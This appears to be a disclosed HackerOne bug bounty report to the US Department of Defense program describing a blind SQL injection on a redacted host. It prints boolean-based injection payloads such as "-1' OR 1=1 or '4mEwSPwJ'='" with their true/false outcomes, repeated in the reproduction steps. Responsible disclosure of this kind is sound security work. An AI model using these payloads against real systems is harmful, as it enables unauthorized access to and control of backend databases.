# Blind SQL iNJECTION 

## Report Details
- **Report ID**: 1102591
- **URL**: https://hackerone.com/reports/1102591
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-13T07:40:02.058Z
- **Disclosed**: 2021-06-03T16:32:38.792Z

## Reporter
- **Username**: 1337n0x
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi DoD Secuirty team ,
i found Blind SQL Injection in this below domain 
https://███████
Proof of concept:
Vuln URL:https://██████████/██████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
███

## Impact

It gives the attacker access and control over the backend database server

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
..Vuln URL:https://██████/█████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
█████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
